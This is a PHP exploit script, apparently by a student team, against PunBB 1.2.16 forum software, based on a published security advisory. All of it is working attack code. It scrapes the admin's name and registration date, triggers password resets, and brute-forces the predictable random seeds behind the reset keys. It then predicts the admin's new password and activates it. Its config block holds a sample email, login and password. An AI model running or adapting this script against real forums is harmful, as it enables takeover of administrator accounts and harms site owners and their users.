<?php
/**
 * Original : http://sektioneins.de/advisories/SE-2008-01.txt
 * Thanks to Stefan Esser, here's the exploit.
 *
 * Team : EpiBite
 * firefox, petit-poney, thot
 * Nous tenons a remercier nos mamans et papas respectifs.
 * Let's get a fu*** coffee !
 */

// conf
define('URL', 'http://localhost/punbb_1-2-16_fr/upload');	// base url
define('EMAIL', 'login_x@epitech.net');				// your email
define('LOGIN', 'login_x');					// your login
define('PASS', '620553.8I73');					// your pass
// Exploit
printf("--\nUrl : %s\nEmail : %s\n--\n", URL, EMAIL);
$h = curl_init();
curl_setopt($h, CURLOPT_URL,
URL.'/userlist.php?username=&show_group=-1&sort_by=registered&sort_dir=ASC&search=Envoyer');
curl_setopt($h, CURLOPT_RETURNTRANSFER, 1);
$s = curl_exec($h);
preg_match('/profile\.php\?id=([0-9]*)">([^<]*)</', $s, $m);
define('ADMIN', $m[2]);
preg_match('/<td class="tcr">([0-9]{4})-([0-9]{2})-([0-9]{2})<\/td/', $s, $m);
if (count($m))
  define('DATE', mktime(0, 0, 0, $m[2], $m[3], $m[1]));
else
  define('DATE', time() - 86400); //just in case, the forum or account
just has been created
printf("Admin : %s\nDate : %s\n--\n", ADMIN, DATE);
$h = curl_init();
curl_setopt($h, CURLOPT_URL, URL.'/login.php?action=forget_2');
// curl_setopt($h, CURLOPT_PROXY, 'proxies.epitech.net:3128');
curl_setopt($h, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($h, CURLOPT_HEADER, 1);
curl_setopt($h, CURLOPT_POST, 1);
curl_setopt($h, CURLOPT_POSTFIELDS, implode('&', array('form_sent=1',
						       'req_email='.urlencode(EMAIL),
						       'request_pass=Envoyer')));
preg_match('/mailto:([^"]*)"/', curl_exec($h), $m);
define('ADMIN_MAIL', $m[1]); // Admin email (normally automatically
get, set manually if there's problem)
printf("Admin mail : %s\n--\n", ADMIN_MAIL);
$h = curl_init();
curl_setopt($h, CURLOPT_URL, URL.'/login.php?action=forget_2');
curl_setopt($h, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($h, CURLOPT_PROXY, 'proxies.epitech.net:3128');
curl_setopt($h, CURLOPT_COOKIE,
'punbb_cookie='.rawurlencode(serialize(array(0 => 2, 1 =>
md5('bite')))));
curl_setopt($h, CURLOPT_HEADER, 1);
curl_setopt($h, CURLOPT_POST, 1);
curl_setopt($h, CURLOPT_POSTFIELDS, implode('&', array('form_sent=1',
						       'req_email='.urlencode(ADMIN_MAIL),
						       'request_pass=Envoyer')));
$s = curl_exec($h);
preg_match('/Set-Cookie:.*punbb_cookie=([^;]*)\;/', $s, $m);
$c = unserialize(urldecode($m[1]));
define('MD5_NOT_LOGGUED', $c[1]);
printf("Md5 not loggued : %s\n--\n", MD5_NOT_LOGGUED);
$h = curl_init();
curl_setopt($h, CURLOPT_URL, URL.'/login.php?action=in');
curl_setopt($h, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($h, CURLOPT_HEADER, 1);
// curl_setopt($h, CURLOPT_PROXY, 'proxies.epitech.net:3128');
curl_setopt($h, CURLOPT_POST, 1);
curl_setopt($h, CURLOPT_POSTFIELDS, implode('&', array('form_sent=1',
						       'redirect_url=index.php',
						       'req_username='.LOGIN,
						       'req_password='.PASS)));
$s = curl_exec($h);
preg_match('/Set-Cookie:.*punbb_cookie=([^;]*)\;/', $s, $m);
$c = unserialize(urldecode($m[1]));
define('MD5_LOGGUED', $c[1]);
printf("Md5 loggued : %s\n--\n", MD5_LOGGUED);
define('PASS_MD5ED', sha1(PASS));
$chars = array('/', '-', "\\", '|');
for ($p = 0; $p < 86400 * 2; $p++)
{
  if (!($p % 300))
    echo $chars[($p / 300) % 4]."\r";
  if (strcmp(MD5_LOGGUED, md5(substr(md5((int)(DATE + $p)),
-8).PASS_MD5ED)) == 0)
    {
      define('SEED', substr(md5(DATE + $p), -8));
      break;
    }
}
printf("Seed : %s\n--\n", SEED);
for ($p = 0; $p < 1000000; $p++)
{
  if (!($p % 300))
    echo $chars[($p / 300) % 4]."\r";
  mt_srand((double)$p);
  if (strcmp(md5(SEED.random_pass(8)), MD5_NOT_LOGGUED) == 0)
    {
      define('SRAND', $p);
      break;
    }
}
printf("SRAND : %s\n--\n", SRAND);
mt_srand(SRAND);
random_pass(8);
printf("New password : %s\n--\n", random_pass(8));
$url = URL.'/profile.php?id=2&action=change_pass&key='.random_pass(8);//
Id is set to '2' (the admin's id, but you can change your target)
$h = curl_init();
curl_setopt($h, CURLOPT_URL, $url);
curl_setopt($h, CURLOPT_RETURNTRANSFER, 1);
curl_exec($h);
function random_pass($len)
{
  $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  $password = '';
  for ($i = 0; $i < $len; ++$i)
    $password .= substr($chars, (mt_rand() % strlen($chars)), 1);
  return $password;
}
